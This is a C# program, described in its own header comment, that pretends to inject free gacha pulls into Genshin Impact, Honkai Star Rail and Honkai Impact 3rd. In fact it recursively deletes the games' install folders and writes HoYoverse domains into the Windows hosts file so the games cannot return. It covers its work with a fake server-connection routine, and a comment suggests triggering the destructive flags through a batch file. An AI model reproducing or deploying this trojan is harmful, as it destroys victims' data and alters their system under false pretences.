//This program claims to inject free gacha pulls into Genshin Impact/other gacha games but instead deletes the game(s) in question and blocks domains related to them to prevent the games from being reinstalled or played again
//Currently only targets Genshin Impact, Honkai Star Rail, and Honkai Impact 3rd

//Spaghetti code written by xad1561

namespace GachaDestroyer
{
    internal class Program
    {
        static void Main(String[] args)
        {
            //Hosts file path, should not need to change this
            string hosts = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), @"drivers\etc\hosts");
            string localhost = "127.0.0.1";
            string contents = File.ReadAllText(hosts);

            //Don't modify these unless you want the program to always do these things
            bool actuallyDeleteFiles = false;
            bool blockDomains = false;

            //Default Directory Paths, change these as necessary
            string GenshinDirEpic = @"C:\Program Files\Epic Games\GenshinImpact";
            string GenshinDir = @"C:\Program Files\Genshin Impact";
            string StarRailDirEpic = @"C:\Program Files\Epic Games\HonkaiStarRail";
            string StarRailDir = @"C:\Program Files\Star Rail";
            string Honkai3DirSteam = @"C:\Program Files (x86)\Steam\steamapps\common\HonkaiImpact3rd";
            string Honkai3DirEpic = @"C:\Program Files\Epic Games\HonkaiImpact3rd";
            string Honkai3Dir = @"C:\Program Files\Honkai Impact 3rd";

            //Don't modify these
            bool GenshinDetected = false;
            bool StarRailDetected = false;
            bool Honkai3Detected = false;

            //The strings of the domains to block. If anybody has information on more related domains, please message me or let me know somehow so I can add them
            //Currently this only contains domains I found by capturing DNS packets with Wireshark and some I found through the absurd method of "looking up the official website for the games"
            string[] domainsToBlock =
            {
                "genshin.hoyoverse.com",
                "hk4e-launcher.hoyoverse.com",
                "hk4e-launcher-static.hoyoverse.com",
                "sg-public-api-static.hoyoverse.com",
                "launcher-webstatic.hoyoverse.com",
                "sdk.hoyoverse.com",
                "sentry.eks.hoyoverse.com",
                "fastcdn.hoyoverse.com",
                "minor-api-os.hoyoverse.com",
                "starrail.hoyoverse.com",
                "abtest-api-data-sg.hoyoverse.com",
                "log-upload-os.hoyoverse.com",
                "hkrpg-launcher-static.hoyoverse.com",
                "api-global-takumi-static.mihoyo.com",
                "sdk-os-static.hoyoverse.com",
                "hoyoverse.com",
                "mihoyo.com",
                "hsr.hoyoverse.com",
                "honkaiimpact3.mihoyo.com",
                "hoyolab.com",
                "zenless.hoyoverse.com" //Future Proofing
            };

            //Check if the --DELETE/--BLOCK argument is given before deleting the files/blocking domains; Idiot Proofing. I sure hope there isn't a file type that lets you write a script, to execute stuff in a batch perhaps, where the arguments could be passed into it from there.
            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "--DELETE")
                {
                    actuallyDeleteFiles = true;
                    //Console.ForegroundColor = ConsoleColor.DarkRed;
                    //Console.WriteLine("Deleting Files");
                }

                if (args[i] == "--BLOCK")
                {
                    blockDomains = true;
                    //Console.ForegroundColor = ConsoleColor.DarkRed;
                    //Console.WriteLine("Blocking Domains");
                }
            }

            //Misc stuff, change cmd to green to make it look more like the matrix and get the date/time
            string dateTime = (DateTime.Now).ToString();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(dateTime);

            //Do the things
            Collide();
            Derail();
            Repurcussion();

            //Block the domains if the --BLOCK arg is given
            if (blockDomains) { blockDomainsToHostsFile(domainsToBlock); }

            //Act like a real program, I don't know how to make this all that convincing because I don't actually play gacha games so enjoy my guess based off of reading a Wikipedia article
            Console.WriteLine("Which game would you like to inject free pulls into? ");
            while (true)
            {
                string input = ((Console.ReadLine()).ToUpper()).Trim();
                if (input == "GENSHIN" | input == "GENSHIN IMPACT" | input == "GI" | input == "HONKAI 4" | input == "HK4")
                {
                    if (GenshinDetected)
                    {
                        fakeInject("Genshin Impact");
                        break;
                    }
                    else
                    {
                        Console.WriteLine("That game is not detected");
                    }
                }

                else if (input == "STAR RAIL" | input == "HONKAI STAR RAIL" | input == "HSR" | input == "HKSR")
                {
                    if (StarRailDetected)
                    {
                        fakeInject("Honkai Star Rail");
                        break;
                    }
                    else
                    {
                        Console.WriteLine("That game is not detected");
                    }
                }

                else if (input == "HONKAI 3RD" | input == "HONKAI 3" | input == "HK3" | input == "HONKAI IMPACT" | input == "HONKAI IMPACT 3RD")
                {
                    if (Honkai3Detected)
                    {
                        fakeInject("Honkai Impact 3rd");
                        break;
                    }
                    else
                    {
                        Console.WriteLine("That game is not detected");
                    }
                }

                else if (input == "QUIT" | input == "EXIT")
                {
                    break;
                }
                else
                {
                    Console.WriteLine("Please enter a valid game or type 'quit' to exit");
                }
            }

            /////////////
            //Functions//
            /////////////

            //Collide, the function that deletes Genshin.
            void Collide()
            {
                //Epic Games
                if (Directory.Exists(GenshinDirEpic))
                {
                    Console.WriteLine("Genshin Impact Detected on Epic Games");
                    GenshinDetected = true;
                    try
                    {
                        if (actuallyDeleteFiles) { Directory.Delete(GenshinDirEpic, true); }
                    }
                    catch { }
                    /*
                    if (dateTime.Contains("8/28/"))
                    {
                        Console.WriteLine("Unhappy Birthday Genshin!");
                    }*/
                }
                else
                {
                    Console.WriteLine("Genshin Impact not detected on Epic Games");
                }

                //Standalone
                if (Directory.Exists(GenshinDir))
                {
                    Console.WriteLine("Standalone Genshin Impact Detected");
                    GenshinDetected = true;
                    try
                    {
                        if (actuallyDeleteFiles) { Directory.Delete(GenshinDir, true); }
                    }
                    catch { }
                }
                else
                {
                    Console.WriteLine("Standalone Genshin Impact not detected");
                }
            }

            //Derail, for removing Star Rail
            void Derail()
            {
                //Epic Games
                if (Directory.Exists(StarRailDirEpic))
                {
                    Console.WriteLine("Honkai Star Rail Detected on Epic Games");
                    StarRailDetected = true;
                    try
                    {
                        if (actuallyDeleteFiles) { Directory.Delete(StarRailDirEpic, true); }
                    }
                    catch { }
                }
                else
                {
                    Console.WriteLine("Honkai Star Rail not detected on Epic Games");
                }

                //Standalone
                if (Directory.Exists(StarRailDir))
                {
                    Console.WriteLine("Standalone Honkai Star Rail Detected");
                    StarRailDetected = true;
                    try
                    {
                        if (actuallyDeleteFiles) { Directory.Delete(StarRailDir, true); }
                    }
                    catch { }
                }
                else
                {
                    Console.WriteLine("Standalone Honkai Star Rail not detected");
                }
            }

            //Repurcussion, for deleting Honkai 3.
            void Repurcussion()
            {
                //Epic Games
                if (Directory.Exists(Honkai3DirEpic))
                {
                    Console.WriteLine("Honkai 3 Detected on Epic Games");
                    Honkai3Detected = true;
                    try
                    {
                        if (actuallyDeleteFiles) { Directory.Delete(Honkai3DirEpic, true); }
                    }
                    catch { }
                }
                else
                {
                    Console.WriteLine("Honkai 3 not detected on Epic Games");
                }

                //Steam
                if (Directory.Exists(Honkai3DirSteam))
                {
                    Console.WriteLine("Honkai 3 Detected on Steam");
                    Honkai3Detected = true;
                    try
                    {
                        if (actuallyDeleteFiles) { Directory.Delete(Honkai3DirSteam, true); }
                    }
                    catch { }
                }
                else
                {
                    Console.WriteLine("Honkai 3 not detected on Steam");
                }

                //Standalone
                if (Directory.Exists(Honkai3Dir))
                {
                    Console.WriteLine("Standalone Honkai 3 Detected");
                    Honkai3Detected = true;
                    try
                    {
                        if (actuallyDeleteFiles) { Directory.Delete(Honkai3Dir, true); }
                    }
                    catch { }
                }
                else
                {
                    Console.WriteLine("Standalone Honkai 3 not detected");
                }
            }

            //Function to block domains to the hosts file
            void blockDomainsToHostsFile(string[] domains)
            {
                bool newLined = false;
                for (int i = 0; i < domains.Length; i++)
                {
                    //Map localhost to each domain in the hosts file, also enjoy my shitty solution to there sometimes not being a newline in the hosts file
                    try
                    {
                        using (StreamWriter sw = File.AppendText(hosts))
                        {
                            if (!newLined)
                            {
                                sw.WriteLine("\n");
                                newLined = true;
                            }
                            if (checkHosts(domains[i]) == false)
                            {
                                sw.WriteLine($"{localhost} {domains[i]}");
                            }
                        }
                    }
                    catch
                    {
                        //Console.WriteLine("Don't have Admin, cannot block hosts");
                        break;
                    }
                }
            }

            //Check if a domain is in the hosts file
            bool checkHosts(string domain)
            {
                if (contents.Contains(domain)) { return true; } else { return false; }
            }

            //Fake injecting free gacha pulls into a given game
            void fakeInject(string game)
            {
                Random rand = new Random();
                Console.WriteLine("Please enter your account username");
                string uname = Console.ReadLine();
                while (true)
                {
                    if (String.IsNullOrEmpty(uname))
                    {
                        Console.WriteLine("Please enter a username");
                        uname = Console.ReadLine();
                    }
                    else
                    {
                        break;
                    }
                }
                Console.WriteLine("How many pulls would you like to inject?");
                string inp = Console.ReadLine();
                int number;
                while (true)
                {
                    try
                    {
                        number = Int32.Parse(inp);
                    }
                    catch
                    {
                        number = 0;
                        Console.WriteLine("Please enter an integer (that means a number without decimal places)");
                        inp = Console.ReadLine();
                    }

                    if (number != 0)
                    {
                        break;
                    }
                }
                //hAcK tHe MaInFrAmE
                Console.WriteLine("Connecting to Hoyoverse servers...");
                System.Threading.Thread.Sleep(2000 + rand.Next(0, 2000));
                Console.WriteLine("Successfully connected to Hoyoverse servers...");
                System.Threading.Thread.Sleep(1500 + rand.Next(0, 2000));
                Console.WriteLine($"Injected an additional {number} pulls into {game} for {uname}, enjoy opening!");
                Console.WriteLine("Press enter to exit");
                Console.ReadLine();
            }
        }
    }
}